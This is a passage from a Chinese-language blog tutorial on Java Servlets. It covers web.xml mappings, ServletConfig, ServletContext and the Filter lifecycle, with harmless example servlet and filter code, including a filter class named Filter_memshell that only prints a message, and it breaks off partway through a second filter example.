class="hljs-comment">&lt;!--这里是给我们的servlet取个别名，一般类名就行--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>Login<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-comment">&lt;!--这里是全类名，也就是让系统知道你上面那个名字是取给谁的--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>example.demo.Login<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--给上面的东西添加映射，可以理解为，上面创建了一个门，这里写门通向哪里--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>        <span class="hljs-comment">&lt;!--和上面的大门名对应--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>Login<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>        <span class="hljs-comment">&lt;!--大门名的接口, 后面运行后的地址加上/ser01，就可以访问到我们的servlet类了--&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/Login<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>tomcaturl访问<code>http://localhost:8080/webapp/password</code>过程如下图所示：</p>
<p><img src="https://img-blog.csdnimg.cn/2382592a676b4cc6aa50d694b01522fe.png" srcset="/img/loading.gif" lazyload alt="JavaWeb.drawio"></p>
<h5 id="ServletConfig"><a href="#ServletConfig" class="headerlink" title="ServletConfig"></a>ServletConfig</h5><p>ServletConfig就是Servlet的配置参数对象，每个Servlet都有一个专属的ServletConfig，负责在初始化时将当前Servlet的配置传递给Servlet，简单来说，ServletConfig就是当前Servlet在web.xml中的配置信息，可以使用<code>getServletConfig()</code>获得当前Servlet的ServletConfig对象。</p>
<p><strong>主要方法</strong></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">getServletName</span><span class="hljs-params">()</span></span> 获取Servlet的别名servlet-name的值<br><span class="hljs-function"><span class="hljs-title">getInitParameter</span><span class="hljs-params">(<span class="hljs-string">&quot;&quot;</span>)</span></span> 获取当前Servlet的初始化值init-param<br><span class="hljs-function"><span class="hljs-title">getServletContext</span><span class="hljs-params">()</span></span> 获取ServletContext对象<br></code></pre></td></tr></table></figure>

<p><strong>测试样例</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// src/main/java/example/demo/Login.java</span><br><span class="hljs-keyword">package</span> example.demo;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletConfig;<br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><br><span class="hljs-meta">@WebServlet(&quot;/password&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Login</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-keyword">private</span> String message;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> &#123;<br>        message = <span class="hljs-string">&quot;欢迎登陆&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123; <br>        resp.setContentType(<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>);<br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">printWriter</span> <span class="hljs-operator">=</span> resp.getWriter();<br>        printWriter.write(<span class="hljs-string">&quot;&lt;pre&gt;&lt;h3&gt;&quot;</span>);<br><br>        <span class="hljs-comment">//获取ServletConfig</span><br>        <span class="hljs-type">ServletConfig</span> <span class="hljs-variable">servletConfig</span> <span class="hljs-operator">=</span> getServletConfig();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> servletConfig.getServletName();<br>        printWriter.write(<span class="hljs-string">&quot;Servlet的名称是&quot;</span>+name);<br>        printWriter.write(<span class="hljs-string">&quot;\n&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">arg1</span> <span class="hljs-operator">=</span> servletConfig.getInitParameter(<span class="hljs-string">&quot;arg1&quot;</span>);<br>        printWriter.write(<span class="hljs-string">&quot;arg1：的值为&quot;</span>+arg1);<br>        printWriter.write(<span class="hljs-string">&quot;&lt;/h3&gt;&lt;/pre&gt;&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        resp.setContentType(<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>);<br>        resp.getWriter().write(<span class="hljs-string">&quot;Post方法&quot;</span> + message);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--/src/main/webapp/WEB-INF/web.xml--&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">web-app</span> <span class="hljs-keyword">PUBLIC</span></span><br><span class="hljs-meta"> <span class="hljs-string">&quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span></span><br><span class="hljs-meta"> <span class="hljs-string">&quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;</span> &gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">display-name</span>&gt;</span>Archetype Created Web Application<span class="hljs-tag">&lt;/<span class="hljs-name">display-name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file-list</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.html<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.htm<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>default.html<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>default.htm<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>default.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file-list</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>Login<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>example.demo.Login<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--  配置当前Servlet上下文参数--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>arg1<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>Servlet_login<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>Login<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/Login<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br>  <span class="hljs-comment">&lt;!--  配置ServletContext上下文参数--&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">context-param</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>arg2<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>Servlet-Global<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">context-param</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/fdcac806944e47249ee680a72f79fa8d.png" srcset="/img/loading.gif" lazyload alt="image-20221124103649762"></p>
<h5 id="ServletContext"><a href="#ServletContext" class="headerlink" title="ServletContext"></a>ServletContext</h5><p>ServletContext是一个全局的存储信息的空间，可以理解为全局变量，一个Web工程内只有一个ServletContext对象实例，是一个域对象。任何ServletConfig都可以通过<code>servletConfig.getServletContext()</code>获得ServletContext对象。同样的ServletContext对象也可以在web.xml设置上下文初始化参数。</p>
<p><strong>主要方法</strong></p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">getContextPath</span><span class="hljs-params">()</span></span> 获得当前工程路径,/工程路径<br><span class="hljs-function"><span class="hljs-title">getRealPath</span><span class="hljs-params">(<span class="hljs-string">&quot;/&quot;</span>)</span></span> 获得工程部署后在服务器硬盘上的绝对路径<br><span class="hljs-function"><span class="hljs-title">getInitParameter</span><span class="hljs-params">(<span class="hljs-string">&quot;&quot;</span>)</span></span> 获得web.xml配置的全局上下文参数context-param<br></code></pre></td></tr></table></figure>

<p><strong>测试样例</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// src/main/java/example/demo/Login.java</span><br><span class="hljs-keyword">package</span> example.demo;<br><br><span class="hljs-keyword">import</span> javax.servlet.ServletConfig;<br><span class="hljs-keyword">import</span> javax.servlet.ServletContext;<br><span class="hljs-keyword">import</span> javax.servlet.ServletException;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><br><span class="hljs-meta">@WebServlet(&quot;/password&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Login</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-keyword">private</span> String message;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> &#123;<br>        message = <span class="hljs-string">&quot;欢迎登陆&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        resp.setContentType(<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>);<br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">printWriter</span> <span class="hljs-operator">=</span> resp.getWriter();<br>        printWriter.write(<span class="hljs-string">&quot;&lt;pre&gt;&lt;h3&gt;&quot;</span>);<br> <br>        <span class="hljs-comment">//获取ServletConfig</span><br>        <span class="hljs-type">ServletConfig</span> <span class="hljs-variable">servletConfig</span> <span class="hljs-operator">=</span> getServletConfig();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> servletConfig.getServletName();<br>        printWriter.write(<span class="hljs-string">&quot;Servlet的名称是&quot;</span>+name);<br>        printWriter.write(<span class="hljs-string">&quot;\n&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">arg1</span> <span class="hljs-operator">=</span> servletConfig.getInitParameter(<span class="hljs-string">&quot;arg1&quot;</span>);<br>        printWriter.write(<span class="hljs-string">&quot;arg1：的值为&quot;</span>+arg1);<br>        printWriter.write(<span class="hljs-string">&quot;\n&quot;</span>);<br><br>        <span class="hljs-comment">// 获得ServletContext</span><br>        <span class="hljs-type">ServletContext</span> <span class="hljs-variable">servletContext</span> <span class="hljs-operator">=</span> servletConfig.getServletContext();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">arg2</span> <span class="hljs-operator">=</span> servletContext.getInitParameter(<span class="hljs-string">&quot;arg2&quot;</span>);<br>        printWriter.write(<span class="hljs-string">&quot;arg2：的值为&quot;</span>+arg2);<br><br>        printWriter.write(<span class="hljs-string">&quot;&lt;/h3&gt;&lt;/pre&gt;&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        resp.setContentType(<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>);<br>        resp.getWriter().write(<span class="hljs-string">&quot;Post方法&quot;</span> + message);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>



<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--/src/main/webapp/WEB-INF/web.xml--&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">web-app</span> <span class="hljs-keyword">PUBLIC</span></span><br><span class="hljs-meta"> <span class="hljs-string">&quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span></span><br><span class="hljs-meta"> <span class="hljs-string">&quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;</span> &gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">display-name</span>&gt;</span>Archetype Created Web Application<span class="hljs-tag">&lt;/<span class="hljs-name">display-name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file-list</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.html<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.htm<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>index.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>default.html<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>default.htm<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">welcome-file</span>&gt;</span>default.jsp<span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">welcome-file-list</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>Login<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-class</span>&gt;</span>example.demo.Login<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-class</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--  配置当前Servlet上下文参数--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>arg1<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>Servlet_login<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>Login<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/Login<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br>  <span class="hljs-comment">&lt;!--  配置ServletContext上下文参数--&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">context-param</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>arg2<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>ServletContext<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">context-param</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/f13a891e866a4c378d6943996a5946fa.png" srcset="/img/loading.gif" lazyload alt="image-20221124104918885"></p>
<h4 id="Filter组件"><a href="#Filter组件" class="headerlink" title="Filter组件"></a>Filter组件</h4><p>Filter组件是运行在服务端的组件，主要功能是对客户端访问资源的过滤，不符合条件的拦截，符合要求的资源使用<code>FilterChain.doFilter()</code>放行，并且可以对访问的目标资源访问前后进行逻辑处理。</p>
<p>​		每个过滤器在客户端向服务器发送请求时进行一次过滤，在服务器向客户端响应时进行一次过滤。一个Servlet可以设置多个Filter，Filter之间按照一定顺序构成调用链，优先级高的先进行调用，每个Filter使用FilterChain接口将处理后的资源传递，其doFIiter()方法用于将本Filter处理完的Servlet资源交给下一个Filter处理，最终交付给Servlet进行响应，Filter调用过程如下图所示：</p>
<p><img src="https://img-blog.csdnimg.cn/007b92c20fbf42fb8d69fd3e1923bf5d.png" srcset="/img/loading.gif" lazyload alt="image-20221117191830346"></p>
<p><img src="https://img-blog.csdnimg.cn/139c1a2ab66f46a4a823916f2c1040e3.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h5 id="Filter生命周期"><a href="#Filter生命周期" class="headerlink" title="Filter生命周期"></a>Filter生命周期</h5><p>Filter生命周期与Servlet一样，Filter的创建和销毁也是由WEB服务器负责。</p>
<ul>
<li>初始化阶段：init(FilterConfig)，只会在web应用启动时调用</li>
<li>拦截和过滤阶段：doFilter(ServletRequest, ServletResponse, FilterChain)，完成实际的过滤操作。当客户请求访问与过滤器关联的URL的时候，Servlet过滤器将先执行doFilter方法。FilterChain参数用于访问后续过滤器。</li>
<li>销毁阶段：destory()，销毁Filter，只会在当web应用移除或服务器停止时才调用一次来卸载Filter对象</li>
</ul>
<h5 id="Filter示例"><a href="#Filter示例" class="headerlink" title="Filter示例"></a>Filter示例</h5><p><strong>Filter_memshell.java</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// src/main/java/Filter_memshell.java</span><br><span class="hljs-keyword">package</span> example.demo;<br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Filter_memshell</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>    <span class="hljs-keyword">private</span> String message;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>        message = <span class="hljs-string">&quot;调用 Filter_mem&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        response.setContentType(<span class="hljs-string">&quot;text/html;charset=UTF-8&quot;</span>);<br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">printWriter</span> <span class="hljs-operator">=</span> response.getWriter();<br><br>        printWriter.write(<span class="hljs-string">&quot;&lt;pre&gt;&lt;h3&gt;&quot;</span>);<br>        printWriter.write(message);<br>        printWriter.write(<span class="hljs-string">&quot;\n&quot;</span>);<br>        <span class="hljs-comment">// 放行请求</span><br>        chain.doFilter(request,response);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>Filter_2.java</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// src/main/java/Filter_2.java</span><br><span class="hljs-keyword">package</span> example.demo;<br><br><span class="hljs-keyword">import</span> javax.servlet.*;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Filter_2</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>    <span class="hljs-keyword">private</span> String message;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>        message = <span class="hljs-string">&quot;调用 Filter_2&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        response.setContentType(<span 